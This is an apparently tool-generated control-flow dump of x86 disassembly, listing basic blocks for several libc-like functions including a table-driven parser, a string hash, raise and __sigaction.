0xb02c2e9:	je	0xb02c4a0
None
|
|
|
v
0xb02c36f:	mov	ecx, edi
0xb02c371:	and	ecx, 0xfffffffd
0xb02c374:	cmp	byte ptr [edx], 0
0xb02c377:	cmove	eax, ecx
0xb02c37a:	add	esp, 0x2c
0xb02c37d:	pop	ebx
0xb02c37e:	pop	esi
0xb02c37f:	pop	edi
0xb02c380:	pop	ebp
0xb02c381:	ret	
None
|
|
|
v
0xb02c4e6:	mov	eax, dword ptr [esp + 0x14]
0xb02c4ea:	mov	ecx, dword ptr [esp + 0x18]
0xb02c4ee:	movzx	edx, byte ptr [eax + 1]
0xb02c4f2:	jmp	0xb02c349
None
|
|
|
v
0xb02c33b:	cmp	dl, 0x5f
0xb02c33e:	je	0xb02c460
None
|
|
|
v
0xb02c440:	mov	edx, dword ptr [esp + 0x48]
0xb02c444:	lea	eax, dword ptr [esi + 1]
0xb02c447:	mov	byte ptr [esi], 0
0xb02c44a:	mov	dword ptr [edx], eax
0xb02c44c:	mov	eax, edi
0xb02c44e:	or	eax, 8
0xb02c451:	cmp	byte ptr [esi + 1], 0
0xb02c455:	cmovne	edi, eax
0xb02c458:	jmp	0xb02c352
None
|
|
|
v
0xb02c4f7:	mov	edi, ebp
0xb02c4f9:	jmp	0xb02c349
None
|
|
|
v
0xb02c308:	test	dl, dl
0xb02c30a:	je	0xb02c326
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:sub_b02c630
TOTAL BLOCKS :66
0xb02c9f8:	cmp	dl, 9
0xb02c9fb:	je	0xb02c961
None
|
|
|
v
0xb02c911:	mov	dword ptr [esp], eax
0xb02c914:	call	0xb017470
None
|
|
|
v
0xb02cbc6:	mov	dword ptr [esp + 0x14], 0x100
0xb02cbce:	jmp	0xb02cba6
None
|
|
|
v
0xb02c7d9:	movsx	edx, byte ptr [ebx + ecx - 0x547e0]
0xb02c7e1:	cmp	edx, dword ptr [esp + 0x1c]
0xb02c7e5:	je	0xb02c9a8
None
|
|
|
v
0xb02c974:	mov	dword ptr [esp + 0x1c], 0
0xb02c97c:	mov	dword ptr [esp + 0x14], 0
0xb02c984:	jmp	0xb02c7cc
None
|
|
|
v
0xb02ccf3:	xor	esi, esi
0xb02ccf5:	jmp	0xb02c905
None
|
|
|
v
0xb02c751:	mov	ecx, dword ptr [esp + 0x20]
0xb02c755:	mov	edx, dword ptr [esp + 0x10]
0xb02c759:	mov	eax, dword ptr [esp + 0x1c]
0xb02c75d:	lea	edi, dword ptr [ecx + edi - 2]
0xb02c761:	lea	ebp, dword ptr [edx + ebp - 4]
0xb02c765:	lea	eax, dword ptr [ecx + eax - 2]
0xb02c769:	cmp	edi, eax
0xb02c76b:	jae	0xb02ccfa
None
|
|
|
v
0xb02c9e0:	mov	ecx, dword ptr [esp + 0x520]
0xb02c9e7:	mov	ecx, dword ptr [ecx]
0xb02c9e9:	movzx	edx, byte ptr [ecx]
0xb02c9ec:	test	dl, dl
0xb02c9ee:	mov	byte ptr [esp + 0x1c], dl
0xb02c9f2:	je	0xb02c96b
None
|
|
|
v
0xb02c8ce:	cmp	byte ptr [ebx + edx - 0x547e0], 1
0xb02c8d6:	jne	0xb02c8b0
None
|
|
|
v
0xb02cb41:	cmp	dl, 0x20
0xb02cb44:	je	0xb02c961
None
|
|
|
v
0xb02c759:	mov	eax, dword ptr [esp + 0x1c]
0xb02c75d:	lea	edi, dword ptr [ecx + edi - 2]
0xb02c761:	lea	ebp, dword ptr [edx + ebp - 4]
0xb02c765:	lea	eax, dword ptr [ecx + eax - 2]
0xb02c769:	cmp	edi, eax
0xb02c76b:	jae	0xb02ccfa
None
|
|
|
v
0xb02c961:	add	ecx, 1
0xb02c964:	movzx	edx, byte ptr [ecx]
0xb02c967:	test	dl, dl
0xb02c969:	jne	0xb02c958
None
|
|
|
v
0xb02c684:	mov	eax, dword ptr [esp + 0x18]
0xb02c688:	mov	ecx, dword ptr [esp + 0x10]
0xb02c68c:	mov	word ptr [edi], si
0xb02c68f:	lea	eax, dword ptr [eax + eax - 2]
0xb02c693:	lea	edx, dword ptr [ecx + eax]
0xb02c696:	cmp	edi, edx
0xb02c698:	jb	0xb02c779
None
|
|
|
v
0xb02c630:	push	ebp
0xb02c631:	push	edi
0xb02c632:	xor	edi, edi
0xb02c634:	push	esi
0xb02c635:	mov	esi, edi
0xb02c637:	push	ebx
0xb02c638:	call	0xb1267db
None
|
|
|
v
0xb02ccfa:	mov	dword ptr [esp + 0x10], ecx
0xb02ccfe:	mov	esi, 1
0xb02cd03:	jmp	0xb02c905
None
|
|
|
v
0xb02c782:	lea	eax, dword ptr [ebx - 0x54766]
0xb02c788:	movsx	ecx, byte ptr [eax + esi]
0xb02c78c:	cmp	ecx, 0xf6
0xb02c78f:	mov	byte ptr [esp + 0x28], cl
0xb02c793:	mov	dword ptr [esp + 0x20], ecx
0xb02c797:	je	0xb02c7eb
None
|
|
|
v
0xb02c7b0:	cmp	ecx, 0x106
0xb02c7b6:	mov	dword ptr [esp + 0x1c], 2
0xb02c7be:	ja	0xb02c7cc
None
|
|
|
v
0xb02c8c6:	add	edx, 1
0xb02c8c9:	cmp	edx, 0x36
0xb02c8cc:	ja	0xb02c8b0
None
|
|
|
v
0xb02c96b:	mov	edx, dword ptr [esp + 0x520]
0xb02c972:	mov	dword ptr [edx], ecx
0xb02c974:	mov	dword ptr [esp + 0x1c], 0
0xb02c97c:	mov	dword ptr [esp + 0x14], 0
0xb02c984:	jmp	0xb02c7cc
None
|
|
|
v
0xb02c63d:	add	ebx, 0x17e9c3
0xb02c643:	sub	esp, 0x50c
0xb02c649:	lea	eax, dword ptr [esp + 0x50]
0xb02c64d:	mov	ecx, eax
0xb02c64f:	lea	ebp, dword ptr [esp + 0x1e0]
0xb02c656:	mov	edi, ecx
0xb02c658:	mov	dword ptr [esp + 0x2c], eax
0xb02c65c:	mov	dword ptr [esp + 0x10], eax
0xb02c660:	lea	eax, dword ptr [esp + 0x44]
0xb02c664:	mov	dword ptr [esp + 0x18], 0xc8
0xb02c66c:	mov	dword ptr [esp + 0x24], ebp
0xb02c670:	mov	dword ptr [esp + 0x30], 0
0xb02c678:	mov	dword ptr [esp + 0x14], 0xfffffffe
0xb02c680:	mov	dword ptr [esp + 0x34], eax
0xb02c684:	mov	eax, dword ptr [esp + 0x18]
0xb02c688:	mov	ecx, dword ptr [esp + 0x10]
0xb02c68c:	mov	word ptr [edi], si
0xb02c68f:	lea	eax, dword ptr [eax + eax - 2]
0xb02c693:	lea	edx, dword ptr [ecx + eax]
0xb02c696:	cmp	edi, edx
0xb02c698:	jb	0xb02c779
None
|
|
|
v
0xb02c905:	mov	edi, dword ptr [esp + 0x2c]
0xb02c909:	mov	eax, dword ptr [esp + 0x10]
0xb02c90d:	cmp	eax, edi
0xb02c90f:	je	0xb02c919
None
|
|
|
v
0xb02c8a3:	movsx	edx, byte ptr [esp + 0x28]
0xb02c8a8:	mov	ecx, dword ptr [esp + 0x10]
0xb02c8ac:	jmp	0xb02c8c1
None
|
|
|
v
0xb02c771:	mov	dword ptr [esp + 0x24], edx
0xb02c775:	mov	dword ptr [esp + 0x10], ecx
0xb02c779:	cmp	esi, 9
0xb02c77c:	je	0xb02ccf3
None
|
|
|
v
0xb02cce9:	mov	esi, 2
0xb02ccee:	jmp	0xb02c905
None
|
|
|
v
0xb02c7c0:	movzx	ecx, byte ptr [ebx + ecx - 0x54700]
0xb02c7c8:	mov	dword ptr [esp + 0x1c], ecx
0xb02c7cc:	mov	ecx, dword ptr [esp + 0x20]
0xb02c7d0:	add	ecx, dword ptr [esp + 0x1c]
0xb02c7d4:	cmp	ecx, 0x36
0xb02c7d7:	ja	0xb02c7eb
None
|
|
|
v
0xb02c7a4:	mov	ecx, dword ptr [esp + 0x14]
0xb02c7a8:	test	ecx, ecx
0xb02c7aa:	jle	0xb02c974
None
|
|
|
v
0xb02c8d8:	movzx	esi, byte ptr [ebx + edx - 0x547a0]
0xb02c8e0:	test	esi, esi
0xb02c8e2:	je	0xb02c8b0
None
|
|
|
v
0xb02c888:	movsx	esi, byte ptr [ebx + eax - 0x5475b]
0xb02c890:	add	edi, 2
0xb02c893:	jmp	0xb02c684
None
|
|
|
v
0xb02c8e4:	mov	ecx, dword ptr [esp + 0x38]
0xb02c8e8:	mov	eax, ebp
0xb02c8ea:	add	ebp, 4
0xb02c8ed:	mov	dword ptr [esp + 0x30], 3
0xb02c8f5:	mov	dword ptr [eax + 4], ecx
0xb02c8f8:	jmp	0xb02c890
None
|
|
|
v
0xb02c990:	cmp	dword ptr [esp + 0x14], 0
0xb02c995:	jle	0xb02c8fa
None
|
|
|
v
0xb02c799:	cmp	dword ptr [esp + 0x14], -2
0xb02c79e:	je	0xb02c9e0
None
|
|
|
v
0xb02c703:	mov	eax, dword ptr [esp + 0x1c]
0xb02c707:	mov	ecx, dword ptr [esp + 0x20]
0xb02c70b:	mov	dword ptr [esp + 8], ebp
0xb02c70f:	lea	edx, dword ptr [eax + 3]
0xb02c712:	and	edx, 0xfffffffc
0xb02c715:	add	edx, ecx
0xb02c717:	mov	dword ptr [esp + 0x28], ecx
0xb02c71b:	mov	ecx, dword ptr [esp + 0x24]
0xb02c71f:	mov	dword ptr [esp], edx
0xb02c722:	mov	dword ptr [esp + 0x20], edx
0xb02c726:	mov	dword ptr [esp + 4], ecx
0xb02c72a:	call	0xb07d0b0
None
|
|
|
v
0xb02c890:	add	edi, 2
0xb02c893:	jmp	0xb02c684
None
|
|
|
v
0xb02ca0a:	lea	edx, dword ptr [ecx + 1]
0xb02ca0d:	mov	dword ptr [esp + 0x3c], edx
0xb02ca11:	movsx	edx, byte ptr [esp + 0x1c]
0xb02ca16:	mov	dword ptr [esp + 0x14], edx
0xb02ca1a:	movzx	edx, byte ptr [esp + 0x1c]
0xb02ca1f:	cmp	dl, 0x7c
0xb02ca22:	ja	0xb02cbc6
None
|
|
|
v
0xb02c8fc:	lea	esi, dword ptr [esi]
None
|
|
|
v
0xb02cb33:	mov	ecx, dword ptr [ebp + 4]
0xb02cb36:	xor	edx, edx
0xb02cb38:	xor	eax, eax
0xb02cb3a:	xor	esi, esi
0xb02cb3c:	jmp	0xb02c84f
None
|
|
|
v
0xb02c6dc:	test	eax, eax
0xb02c6de:	je	0xb02cce9
None
|
|
|
v
0xb02c876:	movsx	si, byte ptr [ebx + edx - 0x547e0]
0xb02c87f:	cmp	cx, si
0xb02c882:	je	0xb02ca33
None
|
|
|
v
0xb02cba6:	mov	ecx, dword ptr [esp + 0x520]
0xb02cbad:	mov	edx, dword ptr [esp + 0x3c]
0xb02cbb1:	mov	dword ptr [ecx], edx
0xb02cbb3:	jmp	0xb02c7a4
None
|
|
|
v
0xb02ca01:	cmp	dl, 0x20
0xb02ca04:	je	0xb02c961
None
|
|
|
v
0xb02c72f:	mov	eax, dword ptr [esp + 0x10]
0xb02c733:	cmp	eax, dword ptr [esp + 0x2c]
0xb02c737:	mov	edx, dword ptr [esp + 0x20]
0xb02c73b:	mov	ecx, dword ptr [esp + 0x28]
0xb02c73f:	je	0xb02c759
None
|
|
|
v
0xb02c7fe:	movzx	eax, byte ptr [ebx + esi - 0x5472d]
0xb02c806:	mov	ecx, eax
0xb02c808:	mov	dword ptr [esp + 0x1c], eax
0xb02c80c:	mov	eax, 1
0xb02c811:	sub	eax, ecx
0xb02c813:	cmp	dl, 0xd
0xb02c816:	mov	ecx, dword ptr [ebp + eax*4]
0xb02c81a:	ja	0xb02c840
None
|
|
|
v
0xb02c8b4:	sub	edi, 2
0xb02c8b7:	movsx	edx, word ptr [edi]
0xb02c8ba:	sub	ebp, 4
0xb02c8bd:	movsx	edx, byte ptr [eax + edx]
0xb02c8c1:	cmp	edx, 0xf6
0xb02c8c4:	je	0xb02c8b0
None
|
|
|
v
0xb02c898:	cmp	dword ptr [esp + 0x30], 3
0xb02c89d:	je	0xb02c990
None
|
|
|
v
0xb02c99b:	mov	dword ptr [esp + 0x14], 0xfffffffe
0xb02c9a3:	jmp	0xb02c8a3
None
|
|
|
v
0xb02c779:	cmp	esi, 9
0xb02c77c:	je	0xb02ccf3
None
|
|
|
v
0xb02c900:	mov	esi, 1
0xb02c905:	mov	edi, dword ptr [esp + 0x2c]
0xb02c909:	mov	eax, dword ptr [esp + 0x10]
0xb02c90d:	cmp	eax, edi
0xb02c90f:	je	0xb02c919
None
|
|
|
v
0xb02c958:	cmp	dl, 9
0xb02c95b:	jne	0xb02cb41
None
|
|
|
v
0xb02c840:	mov	edx, dword ptr [esp + 0x1c]
0xb02c844:	mov	eax, edx
0xb02c846:	add	edx, edx
0xb02c848:	shl	eax, 2
0xb02c84b:	neg	edx
0xb02c84d:	neg	eax
0xb02c84f:	add	eax, ebp
0xb02c851:	add	edi, edx
0xb02c853:	mov	dword ptr [eax + 4], ecx
0xb02c856:	lea	ebp, dword ptr [eax + 4]
0xb02c859:	movzx	eax, byte ptr [ebx + esi - 0x5471f]
0xb02c861:	movzx	ecx, word ptr [edi]
0xb02c864:	movsx	esi, byte ptr [ebx + eax - 0x54779]
0xb02c86c:	movsx	edx, cx
0xb02c86f:	add	edx, esi
0xb02c871:	cmp	edx, 0x36
0xb02c874:	ja	0xb02c888
None
|
|
|
v
0xb02c6b3:	add	eax, 2
0xb02c6b6:	mov	edx, 0x2710
0xb02c6bb:	cmp	eax, 0x2710
0xb02c6c0:	cmovbe	edx, eax
0xb02c6c3:	lea	eax, dword ptr [edx + edx]
0xb02c6c6:	mov	dword ptr [esp + 0x1c], eax
0xb02c6ca:	add	eax, edx
0xb02c6cc:	lea	eax, dword ptr [eax + eax + 3]
0xb02c6d0:	mov	dword ptr [esp], eax
0xb02c6d3:	mov	dword ptr [esp + 0x18], edx
0xb02c6d7:	call	0xb0173f0
None
|
|
|
v
0xb02c81c:	mov	eax, dword ptr [ebx + esi*4 - 0x54a20]
0xb02c823:	add	eax, ebx
0xb02c825:	jmp	eax
None
|
|
|
v
0xb02c69e:	sub	edi, ecx
0xb02c6a0:	sar	edi, 1
0xb02c6a2:	cmp	dword ptr [esp + 0x18], 0x270f
0xb02c6aa:	lea	ebp, dword ptr [edi + 1]
0xb02c6ad:	ja	0xb02cce9
None
|
|
|
v
0xb02c8c1:	cmp	edx, 0xf6
0xb02c8c4:	je	0xb02c8b0
None
|
|
|
v
0xb02c7cc:	mov	ecx, dword ptr [esp + 0x20]
0xb02c7d0:	add	ecx, dword ptr [esp + 0x1c]
0xb02c7d4:	cmp	ecx, 0x36
0xb02c7d7:	ja	0xb02c7eb
None
|
|
|
v
0xb02c741:	mov	dword ptr [esp], eax
0xb02c744:	mov	dword ptr [esp + 0x20], ecx
0xb02c748:	mov	dword ptr [esp + 0x10], edx
0xb02c74c:	call	0xb017470
None
|
|
|
v
0xb02c8b0:	cmp	edi, ecx
0xb02c8b2:	je	0xb02c900
None
|
|
|
v
0xb02ca28:	mov	edx, dword ptr [ebx + edx*4 - 0x549e8]
0xb02ca2f:	add	edx, ebx
0xb02ca31:	jmp	edx
None
|
|
|
v
0xb02c9a8:	movzx	esi, byte ptr [ebx + ecx - 0x547a0]
0xb02c9b0:	test	esi, esi
0xb02c9b2:	je	0xb02cb33
None
|
|
|
v
0xb02c8fa:	jne	0xb02c8a3
None
|
|
|
v
0xb02c919:	add	esp, 0x50c
0xb02c91f:	mov	eax, esi
0xb02c921:	pop	ebx
0xb02c922:	pop	esi
0xb02c923:	pop	edi
0xb02c924:	pop	ebp
0xb02c925:	ret	
None
|
|
|
v
0xb02c84f:	add	eax, ebp
0xb02c851:	add	edi, edx
0xb02c853:	mov	dword ptr [eax + 4], ecx
0xb02c856:	lea	ebp, dword ptr [eax + 4]
0xb02c859:	movzx	eax, byte ptr [ebx + esi - 0x5471f]
0xb02c861:	movzx	ecx, word ptr [edi]
0xb02c864:	movsx	esi, byte ptr [ebx + eax - 0x54779]
0xb02c86c:	movsx	edx, cx
0xb02c86f:	add	edx, esi
0xb02c871:	cmp	edx, 0x36
0xb02c874:	ja	0xb02c888
None
|
|
|
v
0xb02ca33:	movzx	esi, byte ptr [ebx + edx - 0x547a0]
0xb02ca3b:	jmp	0xb02c890
None
|
|
|
v
0xb02c9b8:	mov	eax, dword ptr [esp + 0x38]
0xb02c9bc:	cmp	dword ptr [esp + 0x30], 1
0xb02c9c1:	mov	dword ptr [esp + 0x14], 0xfffffffe
0xb02c9c9:	adc	dword ptr [esp + 0x30], -1
0xb02c9ce:	add	ebp, 4
0xb02c9d1:	mov	dword ptr [ebp], eax
0xb02c9d4:	jmp	0xb02c890
None
|
|
|
v
0xb02c6e4:	mov	edx, dword ptr [esp + 0x10]
0xb02c6e8:	lea	edi, dword ptr [ebp + ebp]
0xb02c6ec:	mov	dword ptr [esp + 8], edi
0xb02c6f0:	shl	ebp, 2
0xb02c6f3:	mov	dword ptr [esp], eax
0xb02c6f6:	mov	dword ptr [esp + 0x20], eax
0xb02c6fa:	mov	dword ptr [esp + 4], edx
0xb02c6fe:	call	0xb07d0b0
None
|
|
|
v
0xb02c7eb:	movzx	edx, byte ptr [ebx + esi - 0x54748]
0xb02c7f3:	movzx	esi, dl
0xb02c7f6:	test	esi, esi
0xb02c7f8:	je	0xb02c898
None
|
|
|
v
0xb02cb4a:	mov	byte ptr [esp + 0x1c], dl
0xb02cb4e:	jmp	0xb02ca0a
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:sub_b02cd20
TOTAL BLOCKS :19
0xb02cd52:	mov	dword ptr [esp], esi
0xb02cd55:	mov	dword ptr [esp + 0xc], eax
0xb02cd59:	lea	eax, dword ptr [ebx - 0x4a926]
0xb02cd5f:	mov	dword ptr [esp + 4], eax
0xb02cd63:	call	0xb07bcc0
None
|
|
|
v
0xb02cdff:	add	esp, 0x2c
0xb02ce02:	pop	ebx
0xb02ce03:	pop	esi
0xb02ce04:	pop	edi
0xb02ce05:	pop	ebp
0xb02ce06:	ret	
None
|
|
|
v
0xb02cdea:	test	eax, eax
0xb02cdec:	je	0xb02ce07
None
|
|
|
v
0xb02ce07:	mov	eax, dword ptr [esp + 0x1c]
0xb02ce0b:	mov	dword ptr [ebp], eax
0xb02ce0e:	jmp	0xb02cdff
None
|
|
|
v
0xb02cdac:	sub	eax, 0x30
0xb02cdaf:	cmp	al, 9
0xb02cdb1:	ja	0xb02cdf0
None
|
|
|
v
0xb02cd32:	add	ebx, 0x17e2ce
0xb02cd38:	test	eax, eax
0xb02cd3a:	je	0xb02cdf0
None
|
|
|
v
0xb02cd20:	push	ebp
0xb02cd21:	mov	ebp, edx
0xb02cd23:	push	edi
0xb02cd24:	mov	edi, ecx
0xb02cd26:	push	esi
0xb02cd27:	mov	esi, eax
0xb02cd29:	push	ebx
0xb02cd2a:	sub	esp, 0x2c
0xb02cd2d:	call	0xb1267db
None
|
|
|
v
0xb02cdf0:	lea	eax, dword ptr [ebx - 0x1d2c]
0xb02cdf6:	mov	dword ptr [ebp], eax
0xb02cdf9:	mov	dword ptr [edi], 2
0xb02cdff:	add	esp, 0x2c
0xb02ce02:	pop	ebx
0xb02ce03:	pop	esi
0xb02ce04:	pop	edi
0xb02ce05:	pop	ebp
0xb02ce06:	ret	
None
|
|
|
v
0xb02cd40:	lea	eax, dword ptr [ebx - 0x4a92e]
0xb02cd46:	mov	dword ptr [esp + 4], eax
0xb02cd4a:	mov	dword ptr [esp], esi
0xb02cd4d:	call	0xb07bcc0
None
|
|
|
v
0xb02cdb3:	lea	eax, dword ptr [esp + 0x14]
0xb02cdb7:	mov	dword ptr [esp + 8], 0xa
0xb02cdbf:	mov	dword ptr [esp + 4], eax
0xb02cdc3:	mov	dword ptr [esp], esi
0xb02cdc6:	call	0xb0346e0
None
|
|
|
v
0xb02cdee:	nop	
None
|
|
|
v
0xb02cd83:	mov	edx, dword ptr [ebx - 0x110]
0xb02cd89:	mov	ecx, dword ptr gs:[0]
0xb02cd90:	mov	ecx, dword ptr [ecx + edx]
0xb02cd93:	jmp	0xb02cda2
None
|
|
|
v
0xb02cd68:	test	eax, eax
0xb02cd6a:	je	0xb02cdf0
None
|
|
|
v
0xb02cdcb:	cmp	esi, dword ptr [esp + 0x14]
0xb02cdcf:	je	0xb02cdf0
None
|
|
|
v
0xb02cd78:	lea	esi, dword ptr [eax + 9]
0xb02cd7b:	movzx	eax, byte ptr [eax + 9]
0xb02cd7f:	test	al, al
0xb02cd81:	je	0xb02cdf0
None
|
|
|
v
0xb02cda2:	movzx	edx, al
0xb02cda5:	test	byte ptr [ecx + edx*2 + 1], 0x20
0xb02cdaa:	jne	0xb02cd98
None
|
|
|
v
0xb02cd98:	add	esi, 1
0xb02cd9b:	movzx	eax, byte ptr [esi]
0xb02cd9e:	test	al, al
0xb02cda0:	je	0xb02cdf0
None
|
|
|
v
0xb02cd70:	mov	edx, dword ptr [esp + 0xc]
0xb02cd74:	test	edx, edx
0xb02cd76:	je	0xb02cdf0
None
|
|
|
v
0xb02cdd1:	mov	dword ptr [edi], eax
0xb02cdd3:	mov	eax, dword ptr [esp + 0xc]
0xb02cdd7:	add	eax, 7
0xb02cdda:	mov	dword ptr [esp + 0x18], eax
0xb02cdde:	lea	eax, dword ptr [esp + 0x18]
0xb02cde2:	mov	dword ptr [esp], eax
0xb02cde5:	call	0xb02c630
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:sub_b02ce10
TOTAL BLOCKS :5
0xb02ce3f:	ret	
None
|
|
|
v
0xb02ce18:	movzx	ecx, byte ptr [edx]
0xb02ce1b:	test	cl, cl
0xb02ce1d:	je	0xb02ce3f
None
|
|
|
v
0xb02ce31:	xor	eax, ecx
0xb02ce33:	shr	ecx, 0x18
0xb02ce36:	xor	eax, ecx
0xb02ce38:	movzx	ecx, byte ptr [edx]
0xb02ce3b:	test	cl, cl
0xb02ce3d:	jne	0xb02ce1f
None
|
|
|
v
0xb02ce1f:	shl	eax, 4
0xb02ce22:	add	edx, 1
0xb02ce25:	add	eax, ecx
0xb02ce27:	mov	ecx, eax
0xb02ce29:	and	ecx, 0xf0000000
0xb02ce2f:	je	0xb02ce18
None
|
|
|
v
0xb02ce10:	mov	edx, dword ptr [esp + 4]
0xb02ce14:	xor	eax, eax
0xb02ce16:	nop	
0xb02ce18:	movzx	ecx, byte ptr [edx]
0xb02ce1b:	test	cl, cl
0xb02ce1d:	je	0xb02ce3f
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:raise
TOTAL BLOCKS :10
0xb02e6ad:	mov	edx, dword ptr [ebx - 0xdc]
0xb02e6b3:	neg	eax
0xb02e6b5:	mov	ecx, dword ptr gs:[0]
0xb02e6bc:	mov	dword ptr [ecx + edx], eax
0xb02e6bf:	or	eax, 0xffffffff
0xb02e6c2:	jmp	0xb02e690
None
|
|
|
v
0xb02e69c:	mov	eax, edi
0xb02e69e:	neg	eax
0xb02e6a0:	and	edi, 0x7fffffff
0xb02e6a6:	cmove	eax, ecx
0xb02e6a9:	mov	edi, eax
0xb02e6ab:	jmp	0xb02e675
None
|
|
|
v
0xb02e66b:	mov	edi, eax
0xb02e66d:	mov	dword ptr gs:[0x68], eax
0xb02e673:	mov	ecx, eax
0xb02e675:	mov	edx, dword ptr [esp + 0xc]
0xb02e679:	xchg	edi, ebx
0xb02e67b:	mov	eax, 0x10e
0xb02e680:	call	dword ptr gs:[0x10]
None
|
|
|
v
0xb02e690:	pop	ebx
0xb02e691:	pop	edi
0xb02e692:	ret	
None
|
|
|
v
0xb02e647:	add	ebx, 0x17c9b9
0xb02e64d:	mov	edi, dword ptr gs:[0x6c]
0xb02e654:	mov	ecx, dword ptr gs:[0x68]
0xb02e65b:	test	ecx, ecx
0xb02e65d:	jne	0xb02e698
None
|
|
|
v
0xb02e640:	push	edi
0xb02e641:	push	ebx
0xb02e642:	call	0xb1267db
None
|
|
|
v
0xb02e698:	test	edi, edi
0xb02e69a:	jg	0xb02e675
None
|
|
|
v
0xb02e65f:	mov	eax, 0xe0
0xb02e664:	call	dword ptr gs:[0x10]
None
|
|
|
v
0xb02e675:	mov	edx, dword ptr [esp + 0xc]
0xb02e679:	xchg	edi, ebx
0xb02e67b:	mov	eax, 0x10e
0xb02e680:	call	dword ptr gs:[0x10]
None
|
|
|
v
0xb02e687:	xchg	ebx, edi
0xb02e689:	cmp	eax, 0xfffff000
0xb02e68e:	ja	0xb02e6ad
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:__sigaction
TOTAL BLOCKS :29
0xb02e7c6:	test	eax, eax
0xb02e7c8:	jns	0xb02e7d8
None
|
|
|
v
0xb02e8fb:	add	ebx, 0x17c705
0xb02e901:	lea	edx, dword ptr [eax - 0x20]
0xb02e904:	cmp	edx, 1
0xb02e907:	jbe	0xb02e910
None
|
|
|
v
0xb02e870:	mov	edx, eax
0xb02e872:	or	edx, 0x4000000
0xb02e878:	test	al, 4
0xb02e87a:	mov	dword ptr [esp + 0xc], edx
0xb02e87e:	lea	eax, dword ptr [ebx - 0x17c8e0]
0xb02e884:	lea	edx, dword ptr [ebx - 0x17c8d8]
0xb02e88a:	cmove	eax, edx
0xb02e88d:	mov	dword ptr [esp + 0x10], eax
0xb02e891:	jmp	0xb02e78a
None
|
|
|
v
0xb02e819:	and	edx, 1
0xb02e81c:	jne	0xb02e848
None
|
|
|
v
0xb02e815:	rep movsd	dword ptr es:[edi], dword ptr [esi]
None
|
|
|
v
0xb02e7b9:	xchg	ebx, edi
0xb02e7bb:	cmp	eax, 0xfffff000
0xb02e7c0:	ja	0xb02e8cf
None
|
|
|
v
0xb02e81e:	mov	edx, dword ptr [esp + 0x98]
0xb02e825:	mov	dword ptr [ebp + 0x84], edx
0xb02e82b:	mov	edx, dword ptr [esp + 0x9c]
0xb02e832:	mov	dword ptr [ebp + 0x88], edx
0xb02e838:	add	esp, 0x120
0xb02e83e:	pop	ebx
0xb02e83f:	pop	esi
0xb02e840:	pop	edi
0xb02e841:	pop	ebp
0xb02e842:	ret	
None
|
|
|
v
0xb02e748:	add	ebx, 0x17c8b8
0xb02e74e:	mov	ebp, dword ptr [esp + 0x13c]
0xb02e755:	test	esi, esi
0xb02e757:	je	0xb02e78e
None
|
|
|
v
0xb02e8f0:	push	esi
0xb02e8f1:	push	ebx
0xb02e8f2:	mov	eax, dword ptr [esp + 0xc]
0xb02e8f6:	call	0xb1267db
None
|
|
|
v
0xb02e8b0:	movzx	edx, byte ptr [esp + 0xa0]
0xb02e8b8:	lea	edi, dword ptr [ebp + 5]
0xb02e8bb:	lea	esi, dword ptr [esp + 0xa1]
0xb02e8c2:	mov	byte ptr [ebp + 4], dl
0xb02e8c5:	mov	edx, 0x7f
0xb02e8ca:	jmp	0xb02e801
None
|
|
|
v
0xb02e759:	lea	edx, dword ptr [esp + 0x14]
0xb02e75d:	mov	eax, dword ptr [esi]
0xb02e75f:	add	esi, 4
0xb02e762:	mov	edi, edx
0xb02e764:	mov	edx, dword ptr [ebx - 0xe0]
0xb02e76a:	mov	cl, 0x20
0xb02e76c:	mov	dword ptr [esp + 8], eax
0xb02e770:	mov	eax, dword ptr [esi + 0x80]
0xb02e776:	mov	edx, dword ptr [edx + 0x194]
0xb02e77c:	rep movsd	dword ptr es:[edi], dword ptr [esi]
None
|
|
|
v
0xb02e858:	movzx	ecx, word ptr [esi]
0xb02e85b:	and	edx, 1
0xb02e85e:	mov	word ptr [edi], cx
0xb02e861:	mov	ecx, 2
0xb02e866:	je	0xb02e81e
None
|
|
|
v
0xb02e817:	jne	0xb02e858
None
|
|
|
v
0xb02e78a:	lea	ecx, dword ptr [esp + 8]
0xb02e78e:	lea	edx, dword ptr [esp + 0x94]
0xb02e795:	test	ebp, ebp
0xb02e797:	mov	edi, dword ptr [esp + 0x134]
0xb02e79e:	mov	eax, 0
0xb02e7a3:	mov	esi, 8
0xb02e7a8:	cmove	edx, eax
0xb02e7ab:	xchg	edi, ebx
0xb02e7ad:	mov	eax, 0xae
0xb02e7b2:	call	dword ptr gs:[0x10]
None
|
|
|
v
0xb02e730:	push	ebp
0xb02e731:	xor	ecx, ecx
0xb02e733:	push	edi
0xb02e734:	push	esi
0xb02e735:	push	ebx
0xb02e736:	sub	esp, 0x120
0xb02e73c:	mov	esi, dword ptr [esp + 0x138]
0xb02e743:	call	0xb1267db
None
|
|
|
v
0xb02e909:	pop	ebx
0xb02e90a:	pop	esi
0xb02e90b:	jmp	0xb02e730
None
|
|
|
v
0xb02e78e:	lea	edx, dword ptr [esp + 0x94]
0xb02e795:	test	ebp, ebp
0xb02e797:	mov	edi, dword ptr [esp + 0x134]
0xb02e79e:	mov	eax, 0
0xb02e7a3:	mov	esi, 8
0xb02e7a8:	cmove	edx, eax
0xb02e7ab:	xchg	edi, ebx
0xb02e7ad:	mov	eax, 0xae
0xb02e7b2:	call	dword ptr gs:[0x10]
None
|
|
|
v
0xb02e7ca:	add	esp, 0x120
0xb02e7d0:	pop	ebx
0xb02e7d1:	pop	esi
0xb02e7d2:	pop	edi
0xb02e7d3:	pop	ebp
0xb02e7d4:	ret	
None
|
|
|
v
0xb02e7d8:	test	ebp, ebp
0xb02e7da:	je	0xb02e7ca
None
|
|
|
v
0xb02e848:	movzx	edx, byte ptr [esi + ecx]
0xb02e84c:	mov	byte ptr [edi + ecx], dl
0xb02e84f:	jmp	0xb02e81e
None
|
|
|
v
0xb02e910:	mov	eax, dword ptr [ebx - 0xdc]
0xb02e916:	mov	edx, dword ptr gs:[0]
0xb02e91d:	mov	dword ptr [edx + eax], 0x16
0xb02e924:	or	eax, 0xffffffff
0xb02e927:	pop	ebx
0xb02e928:	pop	esi
0xb02e929:	ret	
None
|
|
|
v
